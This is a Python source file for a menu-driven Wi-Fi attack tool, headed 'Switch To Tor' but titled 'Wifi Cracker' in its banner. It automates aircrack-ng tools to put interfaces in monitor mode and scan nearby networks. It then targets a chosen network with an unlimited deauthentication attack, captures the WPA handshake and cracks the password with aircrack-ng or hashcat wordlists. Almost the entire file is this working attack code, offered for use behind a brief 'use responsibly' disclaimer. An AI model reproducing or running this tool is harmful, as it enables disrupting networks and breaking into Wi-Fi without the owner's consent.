"""
========================================================================
Program Name: Switch To Tor
Created by: Jutt Cyber Tech
Year: 2025
========================================================================

Description:
This program is created for ethical, educational, and aesthetic purposes.
All code is the intellectual property of Jutt Cyber Tech.

Usage:
- Personal and commercial use allowed.
- Modification, redistribution, resale, or sharing is strictly prohibited.
- For full licence and usage rules, see the LICENSE file.

========================================================================
"""

import subprocess
import os
import re
import sys

import time
import csv

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WifiCracker:
    def get_wireless_interfaces(self):
        """
        Runs 'iwconfig' and parses its output to find wireless interface names.
        Returns a list of interface names or an empty list if none are found.
        """
        try:
            result = subprocess.run(
                ['iwconfig'], capture_output=True, text=True, check=True
            )
            # Regex to find interface names (e.g., wlan0, wlan1mon)
            interfaces = re.findall(r'^([a-zA-Z0-9]+)\s+IEEE', result.stdout, re.MULTILINE)
            return interfaces
        except (FileNotFoundError, subprocess.CalledProcessError):
            # This handles 'iwconfig' not found or returning an error
            return []

    def check_network_status(self):
        """
        Checks all wireless network interfaces for their operational mode
        (e.g., Managed or Monitor) using the 'iwconfig' command.
        """
        print(f"\n{Colors.HEADER}--- Checking Network Interface Status ---{Colors.ENDC}\n")
        try:
            result = subprocess.run(
                ['iwconfig'], 
                capture_output=True, 
                text=True, 
                check=True
            )
            output = result.stdout

            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print(f"{Colors.WARNING}No wireless interfaces found.{Colors.ENDC}")
                return

            print(f"Found {Colors.BOLD}{len(interfaces)}{Colors.ENDC} wireless interface(s):\n")

            # For each found interface, find its mode
            for interface in interfaces:
                # Regex to find the "Mode:" line for a specific interface
                mode_search = re.search(
                    rf"{interface}.*?Mode:([A-Za-z]+)", 
                    output, 
                    re.DOTALL
                )
                
                if mode_search:
                    mode = mode_search.group(1)
                    # Provide a more descriptive status
                    if mode.lower() == "managed":
                        status = f"{Colors.OKGREEN}Normal (Managed Mode){Colors.ENDC}"
                    elif mode.lower() == "monitor":
                        status = f"{Colors.WARNING}Monitor Mode{Colors.ENDC}"
                    else:
                        status = f"{Colors.OKCYAN}{mode} Mode{Colors.ENDC}" # For other modes like Ad-Hoc, etc.
                        
                    print(f"  -> Interface: {Colors.BOLD}{interface:<15}{Colors.ENDC} Status: {status}")
                else:
                    print(f"  -> Interface: {Colors.BOLD}{interface:<15}{Colors.ENDC} Status: {Colors.FAIL}Could not determine mode.{Colors.ENDC}")

        except FileNotFoundError:
            print(f"{Colors.FAIL}Error: 'iwconfig' command not found.{Colors.ENDC}")
            print(f"{Colors.FAIL}Please make sure you are on a Linux system and 'wireless-tools' is installed.{Colors.ENDC}")
        except subprocess.CalledProcessError as e:
            # This can happen if iwconfig returns an error (e.g., no wireless extensions)
            print(f"{Colors.FAIL}An error occurred while running 'iwconfig'.{Colors.ENDC}")
            print(f"{Colors.FAIL}This might mean no wireless interfaces are active.{Colors.ENDC}")
            print(f"Details: {e.stderr.strip()}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

    def enable_monitor_mode(self, interface_name=None):
            """
            Guides the user to switch a selected wireless interface to monitor mode.
            If interface_name is provided, it attempts to switch it directly.
            """
            # Check for root privileges
            if os.geteuid() != 0:
                print(f"{Colors.FAIL}Error: This action requires root privileges.{Colors.ENDC}")
                print(f"{Colors.FAIL}Please run the script with 'sudo python3 app.py'{Colors.ENDC}")
                return False

            if not interface_name: # If not called with a specific interface
                print(f"\n{Colors.HEADER}--- Enable Monitor Mode ---{Colors.ENDC}\n")

            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print(f"{Colors.WARNING}No wireless interfaces found to switch.{Colors.ENDC}")
                return False

            choice = interface_name
            if not choice:
                print("Available wireless interfaces:")
                for i, iface in enumerate(interfaces, 1):
                    print(f"  {i}. {iface}")
                choice = input(f"\n{Colors.OKBLUE}Enter the name of the interface to switch (e.g., wlan0): {Colors.ENDC}").strip()

            try:
                if choice not in interfaces:
                    print(f"\nError: '{choice}' is not a valid wireless interface.")
                    return False

                if not interface_name: # Only print this if in interactive mode
                    print(f"\nAttempting to switch '{choice}' to monitor mode...")
                
                # Commands to switch to monitor mode
                commands = [
                    ['ifconfig', choice, 'down'],
                    ['iwconfig', choice, 'mode', 'monitor'],
                    ['ifconfig', choice, 'up']
                ]

                for cmd in commands:
                    print(f"  -> Running: {Colors.OKCYAN}{' '.join(cmd)}{Colors.ENDC}")
                    subprocess.run(cmd, check=True, capture_output=True)

                if not interface_name: # Only print this if in interactive mode
                    print(f"\n{Colors.OKGREEN}Successfully switched '{choice}' to monitor mode.{Colors.ENDC}")
                    print("You can verify by running option 1 again.")
                return True

            except subprocess.CalledProcessError as e:
                print(f"\n{Colors.FAIL}An error occurred while executing a command.{Colors.ENDC}")
                print("This could be a permissions issue or an unsupported device.")
                print(f"Command: {' '.join(e.cmd)}")
                print(f"Error output: {e.stderr.decode().strip()}")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
            return False

    def disable_monitor_mode(self):
            """
            Guides the user to switch a selected wireless interface back to managed mode.
            """
            print(f"\n{Colors.HEADER}--- Disable Monitor Mode (Switch to Managed Mode) ---{Colors.ENDC}\n")
    
            # Check for root privileges
            if os.geteuid() != 0:
                print(f"{Colors.FAIL}Error: This action requires root privileges.{Colors.ENDC}")
                print(f"{Colors.FAIL}Please run the script with 'sudo python3 app.py'{Colors.ENDC}")
                return
    
            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print(f"{Colors.WARNING}No wireless interfaces found to switch.{Colors.ENDC}")
                return
    
            print("Available wireless interfaces:")
            for i, iface in enumerate(interfaces, 1):
                print(f"  {i}. {iface}")
    
            try:
                choice = input(f"\n{Colors.OKBLUE}Enter the name of the interface to switch (e.g., wlan0mon): {Colors.ENDC}").strip()
    
                if choice not in interfaces:
                    print(f"\nError: '{choice}' is not a valid wireless interface.")
                    return
    
                print(f"\nAttempting to switch '{choice}' to managed mode...")
    
                # Commands to switch to managed mode
                commands = [
                    ['ifconfig', choice, 'down'],
                    ['iwconfig', choice, 'mode', 'managed'],
                    ['ifconfig', choice, 'up']
                ]
    
                for cmd in commands:
                    print(f"  -> Running: {Colors.OKCYAN}{' '.join(cmd)}{Colors.ENDC}")
                    subprocess.run(cmd, check=True, capture_output=True)
    
                print(f"\n{Colors.OKGREEN}Successfully switched '{choice}' to managed mode.{Colors.ENDC}")
                print("You can verify by running option 1 again.")
    
            except (subprocess.CalledProcessError, Exception) as e:
                print(f"\n{Colors.FAIL}An error occurred while executing a command.{Colors.ENDC}")
                print(f"Details: {e}")

    def enable_network_manager(self):
            """
            Starts the NetworkManager service using systemctl.
            """
            print(f"\n{Colors.HEADER}--- Enabling Network Manager ---{Colors.ENDC}\n")
    
            # Check for root privileges
            if os.geteuid() != 0:
                print(f"{Colors.FAIL}Error: This action requires root privileges.{Colors.ENDC}")
                print(f"{Colors.FAIL}Please run the script with 'sudo python3 app.py'{Colors.ENDC}")
                return
    
            try:
                command = ['systemctl', 'start', 'NetworkManager']
                print(f"  -> Running: {Colors.OKCYAN}{' '.join(command)}{Colors.ENDC}")
                
                # Execute the command
                subprocess.run(command, check=True, capture_output=True, text=True)
                
                print(f"\n{Colors.OKGREEN}Successfully sent command to start Network Manager.{Colors.ENDC}")
                print("You can check its status with: 'systemctl status NetworkManager'")
    
            except FileNotFoundError:
                print(f"{Colors.FAIL}Error: 'systemctl' command not found. This script may not be on a systemd-based Linux.{Colors.ENDC}")
            except subprocess.CalledProcessError as e:
                print(f"\n{Colors.FAIL}An error occurred while trying to start Network Manager.{Colors.ENDC}")
                print(f"Error output: {e.stderr.strip()}")

    def scan_wifi_networks(self):
            """
            Launches 'airodump-ng' to scan for networks on an interface in monitor mode.
            """
            # --- This function has been significantly updated ---
            print(f"\n{Colors.HEADER}--- Scan for Nearby Wi-Fi Networks ---{Colors.ENDC}\n")
            print(f"{Colors.WARNING}This option uses 'airodump-ng' and requires an interface in MONITOR MODE.{Colors.ENDC}")
    
            if os.geteuid() != 0:
                print(f"{Colors.FAIL}Error: This action requires root privileges.{Colors.ENDC}")
                print(f"{Colors.FAIL}Please run the script with 'sudo python3 app.py'{Colors.ENDC}")
                return
    
            # Check if airodump-ng is installed by checking for its parent suite
            try:
                subprocess.run(['which', 'airodump-ng'], check=True, capture_output=True)
            except (FileNotFoundError, subprocess.CalledProcessError):
                print(f"{Colors.FAIL}Error: 'airodump-ng' not found. Please install the 'aircrack-ng' suite.{Colors.ENDC}")
                return
    
            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print(f"{Colors.WARNING}No wireless interfaces found to use for scanning.{Colors.ENDC}")
                return
    
            print("\nAvailable wireless interfaces for scanning:")
            # Get full status to show the mode next to the interface name
            try:
                iwconfig_output = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True).stdout
                for iface in interfaces:
                    mode_search = re.search(rf"{iface}.*?Mode:([A-Za-z]+)", iwconfig_output, re.DOTALL)
                    mode = mode_search.group(1) if mode_search else "Unknown"
                    print(f"  - {Colors.BOLD}{iface:<15}{Colors.ENDC} (Mode: {mode})")
            except Exception:
                # Fallback if parsing fails for any reason
                for iface in interfaces:
                    print(f"  - {iface}")
    
            scan_process = None # Initialize scan_process to None before the try block

            try:
                choice = input(f"\n{Colors.OKBLUE}Enter the name of the interface to use for scanning (e.g., wlan0mon): {Colors.ENDC}").strip()
                if choice not in interfaces:
                    print(f"\n{Colors.FAIL}Error: '{choice}' is not a valid interface.{Colors.ENDC}")
                    return
                
                # Verify the selected interface is in Monitor mode
                iwconfig_result = subprocess.run(['iwconfig', choice], capture_output=True, text=True)
                is_monitor_mode = "Mode:Monitor" in iwconfig_result.stdout.replace(" ", "")

                if not is_monitor_mode:
                    print(f"\n{Colors.FAIL}Error: Interface '{choice}' is not in monitor mode.{Colors.ENDC}")
                    prompt = input(f"{Colors.OKBLUE}Would you like to enable monitor mode for '{choice}' now? (y/n): {Colors.ENDC}").strip().lower()
                    if prompt == 'y':
                        print(f"\n{Colors.OKCYAN}Attempting to enable monitor mode...{Colors.ENDC}")
                        if not self.enable_monitor_mode(interface_name=choice):
                            print(f"\n{Colors.FAIL}Failed to enable monitor mode. Please try again from the main menu.{Colors.ENDC}")
                            return # Return to main menu if enabling failed
                        print(f"\n{Colors.OKGREEN}Monitor mode enabled successfully. Continuing with scan...{Colors.ENDC}")
                        time.sleep(2) # Pause to let the user see the message
                    else:
                        print(f"{Colors.WARNING}Scan cancelled. Please enable monitor mode to proceed.{Colors.ENDC}")
                        return
                
                # --- New logic to run in the same terminal ---
                output_prefix = "/tmp/wifi_scan"
                discovered_networks = []
                
                # Command to run airodump-ng and write to a CSV file
                command = [
                    'airodump-ng',
                    '--write', output_prefix,
                    '--output-format', 'csv',
                    '--write-interval', '1', # Write to file every 1 second
                    choice  # The selected interface
                ]
                
                print(f"\n{Colors.OKCYAN}Starting background scan... Press Ctrl+C to stop.{Colors.ENDC}")
                time.sleep(2) # Give airodump-ng a moment to start up
                
                # Start the scan in the background, hiding its own output
                scan_process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
                # Loop to read and display data
                active_scan = True
                while True:
                    os.system('clear')
                    print(f"{Colors.HEADER}--- Live Wi-Fi Scan --- (Press Ctrl+C to stop){Colors.ENDC}\n")
                    
                    # The CSV file is named <prefix>-01.csv
                    csv_filename = f"{output_prefix}-01.csv"
                    
                    if not os.path.exists(csv_filename):
                        print(f"{Colors.WARNING}Waiting for data...{Colors.ENDC}")
                        time.sleep(1)
                        continue
    
                    current_networks = []
                    with open(csv_filename, 'r', newline='') as f:
                        reader = csv.reader(f)
                        # Skip lines until we find the Access Point section
                        for row in reader:
                            if row and "BSSID" in row[0]:
                                break
                        
                        print(f"{Colors.BOLD}{'#':<3} {'BSSID':<20} {'PWR':<5} {'CH':<4} {'ENC':<10} {'ESSID'}{Colors.ENDC}")
                        print(f"{Colors.BOLD}{'-' * 80}{Colors.ENDC}")
                        
                        # Read and print each access point
                        for i, row in enumerate(reader, 1):
                            if not row or not row[0].strip(): # Stop if we hit the client section
                                break
                            bssid, _, _, channel, _, _, _, power, _, _, _, _, _, essid, *_ = [col.strip() for col in row]
                            encryption = row[5].strip()
                            current_networks.append({"bssid": bssid, "channel": channel, "essid": essid})
                            print(f"{i:<3} {bssid:<20} {power:<5} {channel:<4} {encryption:<10} {essid}")
                    
                    discovered_networks = current_networks
                    time.sleep(0.5) # Refresh every 0.5 seconds for a faster update rate
    
            except KeyboardInterrupt:
                print(f"\n\n{Colors.WARNING}Scan stopped by user.{Colors.ENDC}")
                active_scan = False # Signal that the scan loop has ended
            except Exception as e:
                print(f"An unexpected error occurred: {e}")
                active_scan = False
            finally:
                # --- Cleanup ---
                if scan_process:
                    scan_process.terminate() # Stop the background process
                    scan_process.wait()
                
                # Clean up the temporary files created by airodump-ng
                for file in os.listdir('/tmp/'):
                    if file.startswith("wifi_scan-"):
                        os.remove(os.path.join('/tmp/', file))
                print(f"{Colors.OKCYAN}Cleanup complete.{Colors.ENDC}")
    
            # --- New logic for targeting a network ---
            if not active_scan and discovered_networks:
                print(f"\n{Colors.HEADER}--- Target Selection ---{Colors.ENDC}\n")
                target_choice = input(f"{Colors.OKBLUE}Enter network # to target, or 'q' to return to menu: {Colors.ENDC}").strip()
    
                if target_choice.lower() == 'q':
                    return
                
                try:
                    target_index = int(target_choice) - 1
                    if 0 <= target_index < len(discovered_networks):
                        target = discovered_networks[target_index]
                        bssid = target['bssid']
                        channel = target['channel']
                        interface = choice # The interface chosen at the start
    
                        print(f"\nSelected Target: {Colors.BOLD}{target['essid']}{Colors.ENDC} ({bssid})")
                        print(f"{Colors.OKCYAN}Choose an action:{Colors.ENDC}")
                        print(f"  {Colors.OKBLUE}1.{Colors.ENDC} Targeted Scan (view clients)")
                        print(f"  {Colors.OKBLUE}2.{Colors.ENDC} Deauthentication Attack (disconnect clients)")
                        print(f"  {Colors.OKBLUE}3.{Colors.ENDC} Targeted Scan + Deauth Attack (for handshake capture)")
                        action_choice = input(f"{Colors.OKBLUE}Enter action choice: {Colors.ENDC}").strip()
    
                        if action_choice in ['1', '2', '3']:
                            if action_choice == '2':
                                # Action 2: Deauth attack only
                                print(f"\n{Colors.WARNING}Starting deauthentication attack on {bssid}...{Colors.ENDC}")
                                print(f"{Colors.FAIL}{Colors.BOLD}WARNING: This will disrupt the network. Use responsibly.{Colors.ENDC}")
                                self.run_in_new_terminal(['aireplay-ng', '--deauth', '0', '-a', bssid, interface])
                            elif action_choice == '1':
                                # Action 1: View clients only
                                print(f"\n{Colors.HEADER}--- Targeted Scan Mode (View Only) ---{Colors.ENDC}")
                                print(f"\n{Colors.OKCYAN}Press Ctrl+C in this window to stop the scan.{Colors.ENDC}")
                                time.sleep(2)
                                self.run_interactive_command(['airodump-ng', '--bssid', bssid, '-c', channel, interface])
                            else:
                                # Action 3: Capture handshake with deauth
                                print(f"\n{Colors.WARNING}{'='*60}{Colors.ENDC}")
                                print(f"{Colors.HEADER}--- Handshake Capture Mode ---{Colors.ENDC}")
                                print(f"{Colors.WARNING}{Colors.BOLD}IMPORTANT: Wait for '[ WPA handshake: ... ]' to appear in{Colors.ENDC}")
                                print(f"{Colors.WARNING}{Colors.BOLD}           the top-right of the scan before stopping.{Colors.ENDC}")
                                print(f"{Colors.WARNING}{'='*60}{Colors.ENDC}")
                                
                                # --- Logic for simple, sequential file naming ---
                                i = 1
                                while True:
                                    capture_file_path = f"./capture-{i}"
                                    if not any(f.startswith(os.path.basename(capture_file_path)) for f in os.listdir('.')):
                                        break
                                    i += 1
                                print(f"\n{Colors.OKCYAN}Capture file will be saved as '{os.path.basename(capture_file_path)}-01.cap'.{Colors.ENDC}")
                                time.sleep(4)
                                
                                self.run_in_new_terminal(['aireplay-ng', '--deauth', '0', '-a', bssid, interface])
                                self.run_interactive_command(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', capture_file_path, interface])
                        else:
                            print(f"{Colors.FAIL}Invalid action choice.{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}Invalid network number.{Colors.ENDC}")
                except ValueError:
                    print(f"{Colors.FAIL}Invalid input. Please enter a number.{Colors.ENDC}")

    def run_in_new_terminal(self, command: list):
            """Helper function to run a command in a new terminal window."""
            terminals = {
                'x-terminal-emulator': '-e', 'gnome-terminal': '--',
                'konsole': '-e', 'xfce4-terminal': '-e'
            }
            terminal_cmd = []
            for term, arg in terminals.items():
                if subprocess.run(['which', term], capture_output=True).returncode == 0:
                    terminal_cmd = [term, arg]
                    break
            
            if not terminal_cmd:
                print(f"\n{Colors.FAIL}Error: Could not find a supported terminal emulator.{Colors.ENDC}")
                return False
    
            subprocess.Popen(terminal_cmd + command)
            print(f"{Colors.OKCYAN}Command '{command[0]}' started in a new window.{Colors.ENDC}")
            return True

    def run_interactive_command(self, command: list):
            """Helper function to run a command directly in the current terminal."""
            try:
                os.system('clear')
                subprocess.run(command)
            except KeyboardInterrupt:
                print(f"\n\n{Colors.WARNING}Process '{command[0]}' stopped by user.{Colors.ENDC}")
            except Exception as e:
                print(f"\nAn error occurred: {e}")

    def crack_handshake(self):
            """
            Attempts to crack a WPA/WPA2 handshake from a .cap file using a wordlist.
            """
            print(f"\n{Colors.HEADER}--- Crack WPA/WPA2 Handshake ---{Colors.ENDC}\n")
    
            # Check if aircrack-ng is installed
            try:
                subprocess.run(['which', 'aircrack-ng'], check=True, capture_output=True)
            except (FileNotFoundError, subprocess.CalledProcessError):
                print(f"{Colors.FAIL}Error: 'aircrack-ng' not found. Please install the 'aircrack-ng' suite.{Colors.ENDC}")
                return
    
            cap_file = None # Initialize
            try:
                # --- Get capture file from user ---
                print("Available .cap files in the current directory:")
                cap_files = [f for f in os.listdir('.') if f.endswith('.cap')]
                if not cap_files:
                    print(f"  {Colors.WARNING}(No .cap files found in this directory){Colors.ENDC}")
                    return
                else:
                    for i, f in enumerate(cap_files, 1):
                        print(f"  {i}. {f}")
                
                choice = input("\nEnter the number of the handshake file to crack: ").strip()
                choice_index = int(choice) - 1
                if 0 <= choice_index < len(cap_files):
                    cap_file = cap_files[choice_index]
                else:
                    print(f"\n{Colors.FAIL}Invalid number.{Colors.ENDC}")
                    return
    
            except ValueError:
                print(f"\n{Colors.FAIL}Invalid input. Please enter a number.{Colors.ENDC}")
                return
            except Exception as e:
                print(f"\nAn error occurred while listing files: {e}")
                return
    
            # --- New logic for wordlist selection ---
            wordlist = None
            try:
                print(f"\n{Colors.HEADER}--- Wordlist Selection ---{Colors.ENDC}")
                wordlist_options = [] # Will store tuples of (short_name, full_path)
                wordlist_dir = '/usr/share/wordlists/'
                if os.path.isdir(wordlist_dir):
                    for root, _, files in os.walk(wordlist_dir):
                        for file in files:
                            if file.endswith(('.txt', '.gz')):
                                full_path = os.path.join(root, file)
                                # Get a more readable name relative to the main wordlist dir
                                display_name = os.path.relpath(full_path, wordlist_dir)
                                wordlist_options.append((display_name, full_path))
                
                if not wordlist_options:
                    print(f"{Colors.WARNING}No common wordlists found. Please enter path manually.{Colors.ENDC}")
                    wordlist = input(f"{Colors.OKBLUE}Enter the path to your wordlist file: {Colors.ENDC}").strip()
                else:
                    print("Common wordlists found:")
                    for i, (display_name, _) in enumerate(wordlist_options, 1):
                        print(f"  {i}. {display_name}")
                    print(f"  {Colors.OKBLUE}m.{Colors.ENDC} Enter path manually")
                    
                    wl_choice = input(f"\n{Colors.OKBLUE}Enter the number of the wordlist to use (or 'm'): {Colors.ENDC}").strip()
                    if wl_choice.lower() == 'm':
                        wordlist = input(f"{Colors.OKBLUE}Enter the path to your wordlist file: {Colors.ENDC}").strip()
                    else:
                        wl_index = int(wl_choice) - 1
                        if 0 <= wl_index < len(wordlist_options):
                            # Get the full path from the selected option
                            wordlist = wordlist_options[wl_index][1]
                        else:
                            print(f"\n{Colors.FAIL}Invalid number.{Colors.ENDC}")
                            return
                
                if not os.path.exists(wordlist):
                    print(f"\n{Colors.FAIL}Error: Wordlist file '{wordlist}' not found.{Colors.ENDC}")
                    return
            except (ValueError, IndexError):
                print(f"\n{Colors.FAIL}Invalid input.{Colors.ENDC}")
                return
    
            print(f"\n{Colors.OKCYAN}Starting cracking process... This can take a very long time.{Colors.ENDC}")
            print(f"{Colors.OKCYAN}Press Ctrl+C to stop.{Colors.ENDC}\n")
            time.sleep(2)
    
            # --- Ask for cracking method ---
            print(f"\n{Colors.HEADER}--- Cracking Method ---{Colors.ENDC}")
            print(f"  {Colors.OKBLUE}1.{Colors.ENDC} CPU (aircrack-ng, slower)")
            print(f"  {Colors.OKBLUE}2.{Colors.ENDC} GPU (hashcat, much faster)")
            method_choice = input(f"{Colors.OKBLUE}Choose cracking method: {Colors.ENDC}").strip()
    
            try:
                if method_choice == '1':
                    # --- CPU Cracking with aircrack-ng ---
                    print("\nStarting CPU cracking with aircrack-ng...")
                    command = ['aircrack-ng', '-w', wordlist, cap_file]
                    subprocess.run(command)
    
                elif method_choice == '2':
                    # --- GPU Cracking with hashcat ---
                    try:
                        subprocess.run(['which', 'hashcat'], check=True, capture_output=True)
                    except (FileNotFoundError, subprocess.CalledProcessError):
                        print(f"\n{Colors.FAIL}Error: 'hashcat' not found. Please install it to use GPU acceleration.{Colors.ENDC}")
                        return
    
                    # First, use aircrack-ng to validate that there is a handshake to crack.
                    # The '-q' flag quits after finding the first network with a handshake.
                    print(f"\n{Colors.OKCYAN}Validating handshake presence with aircrack-ng...{Colors.ENDC}")
                    validation_cmd = ['aircrack-ng', '-a', '2', '-q', '-b', '00:00:00:00:00:00', cap_file]
                    result = subprocess.run(validation_cmd, capture_output=True, text=True)
                    
                    if "No matching network found" in result.stdout:
                        print(f"\n{Colors.FAIL}Validation failed: No network with a usable handshake found in the file.{Colors.ENDC}")
                        return
                    
                    print(f"{Colors.OKGREEN}Validation successful! Handshake detected. Proceeding with GPU cracking.{Colors.ENDC}")
                    print(f"\n{Colors.OKCYAN}Starting GPU cracking with hashcat...{Colors.ENDC}")
                    
                    # Now, convert to the modern .hc22000 format for hashcat, which we know will succeed.
                    hc22000_file = None
                    try:
                        print(f"{Colors.WARNING}Note: For true GPU acceleration, ensure you have the correct drivers (e.g., NVIDIA CUDA Toolkit) installed and configured for hashcat.{Colors.ENDC}")
                        hc22000_file = cap_file.replace('.cap', '.hc22000')
                        # Use aircrack-ng to convert the .cap file to the .hc22000 format
                        convert_command = ['aircrack-ng', '-o', hc22000_file, '-J', '/tmp/dummy', cap_file]
                        subprocess.run(convert_command, check=True, capture_output=True)
                        
                        # Hash mode 22000 is the modern standard for WPA-PBKDF2-PMKID+EAPOL
                        command = ['hashcat', '--force', '-m', '22000', hc22000_file, wordlist]
                        subprocess.run(command)
                    finally:
                        # Cleanup the temporary .hc22000 file and dummy files
                        if hc22000_file and os.path.exists(hc22000_file):
                            os.remove(hc22000_file)
                            print(f"{Colors.OKCYAN}Cleaned up temporary file: {hc22000_file}{Colors.ENDC}")
                        if os.path.exists('/tmp/dummy.hccapx'):
                            os.remove('/tmp/dummy.hccapx')
                else:
                    print(f"{Colors.FAIL}Invalid method choice.{Colors.ENDC}")
    
            except KeyboardInterrupt:
                print(f"\n\n{Colors.WARNING}Cracking process stopped by user.{Colors.ENDC}")
            except Exception as e:
                print(f"\nAn error occurred during the cracking process: {e}")

    def init_title(self):
            """
            Displays the initial program title inside a larger, centered box.
            """
            os.system('clear')
            
            try:
                # Get terminal dimensions to properly center the box
                terminal_width = os.get_terminal_size().columns
                terminal_height = os.get_terminal_size().lines
            except OSError:
                # Fallback for environments where terminal size can't be determined
                terminal_width = 80
                terminal_height = 24

            box_width = 50
            title = "Wifi Cracker"
            line1 = "Developed by Jutt Studio"
            line2 = "Created by JS"
            line3 = "js434@proton.me"
            line4 = "Version 1.0"

            # Create the box content as a list of strings
            box_content = [
                f"{Colors.HEADER}╔{'═' * box_width}╗{Colors.ENDC}",
                f"{Colors.HEADER}║{Colors.BOLD}{title.center(box_width)}{Colors.ENDC}{Colors.HEADER}║{Colors.ENDC}",
                f"{Colors.HEADER}╠{'═' * box_width}╣{Colors.ENDC}",
                f"{Colors.HEADER}║{Colors.OKCYAN}{line1.center(box_width)}{Colors.ENDC}{Colors.HEADER}║{Colors.ENDC}",
                f"{Colors.HEADER}║{Colors.OKCYAN}{line2.center(box_width)}{Colors.ENDC}{Colors.HEADER}║{Colors.ENDC}",
                f"{Colors.HEADER}║{Colors.OKCYAN}{line3.center(box_width)}{Colors.ENDC}{Colors.HEADER}║{Colors.ENDC}",
                f"{Colors.HEADER}║{Colors.OKCYAN}{line4.center(box_width)}{Colors.ENDC}{Colors.HEADER}║{Colors.ENDC}",
                f"{Colors.HEADER}╚{'═' * box_width}╝{Colors.ENDC}"
            ]

            # Calculate padding for horizontal centering
            left_padding = " " * ((terminal_width - box_width - 2) // 2)

            print('\n\n') # Add some static padding at the top
            for line in box_content:
                print(f"{left_padding}{line}")
            
            time.sleep(2) # A short pause to appreciate the title
    def __init__(self):
            """
            Initializes the WifiCracker application.
            """
            self.init_title()

    def run(self):
            """
            Main application loop to display the menu and handle user input.
            """
            # A friendly check for sudo if the user hasn't run the script with it.
            if os.geteuid() != 0:
                print(f"{Colors.WARNING}--- Note: Run with 'sudo' to enable all features (like monitor mode) ---{Colors.ENDC}\n")
            
            while True:
                print(f"\n{Colors.HEADER}{'='*40}{Colors.ENDC}")
                print(f"{Colors.HEADER}          Main Menu{Colors.ENDC}")
                print(f"{Colors.HEADER}{'='*40}{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}1.{Colors.ENDC} {Colors.BOLD}📡 Check network interface status{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}2.{Colors.ENDC} {Colors.BOLD}👁️  Enable monitor mode{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}3.{Colors.ENDC} {Colors.BOLD}🔒 Disable monitor mode{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}4.{Colors.ENDC} {Colors.BOLD}🔌 Enable Network Manager{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}5.{Colors.ENDC} {Colors.BOLD}🔍 Scan for Wi-Fi networks{Colors.ENDC}")
                print(f"  {Colors.OKBLUE}6.{Colors.ENDC} {Colors.BOLD}🔑 Crack handshake file{Colors.ENDC}")
                print(f"  {Colors.FAIL}q.{Colors.ENDC} {Colors.BOLD}🚪 Quit{Colors.ENDC}")
                print(f"{Colors.HEADER}{'-'*40}{Colors.ENDC}")
                
                try:
                    choice = input(f"{Colors.OKBLUE}Enter your choice: {Colors.ENDC}").strip()
        
                    if choice == '1':
                        self.check_network_status()
                    elif choice == '2':
                        self.enable_monitor_mode()
                    elif choice == '3':
                        self.disable_monitor_mode()
                    elif choice == '4':
                        self.enable_network_manager()
                    elif choice == '5':
                        self.scan_wifi_networks()
                    elif choice == '6':
                        self.crack_handshake()
                    elif choice.lower() == 'q':
                        print("Exiting program. Goodbye!")
                        break
                    else:
                        print(f"{Colors.FAIL}Invalid choice, please try again.{Colors.ENDC}")
                        time.sleep(2)
        
                    # After any action (except quit), pause and redraw the menu
                    if choice.lower() != 'q':
                        print("\n" + "-"*40)
                        input(f"{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
                        os.system('clear')
    
                        self.init_title()
                except KeyboardInterrupt:
                    print(f"\n{Colors.WARNING}Operation cancelled. Use 'q' to quit.{Colors.ENDC}")
                    time.sleep(2)
                    os.system('clear')
                    self.init_title()

if __name__ == "__main__":
    # The script is intended for Linux (Kali)
    if sys.platform != "linux":
        print(f"{Colors.FAIL}This script is designed for Linux systems and may not work correctly.{Colors.ENDC}")
    else:
        app = WifiCracker()
        app.run()

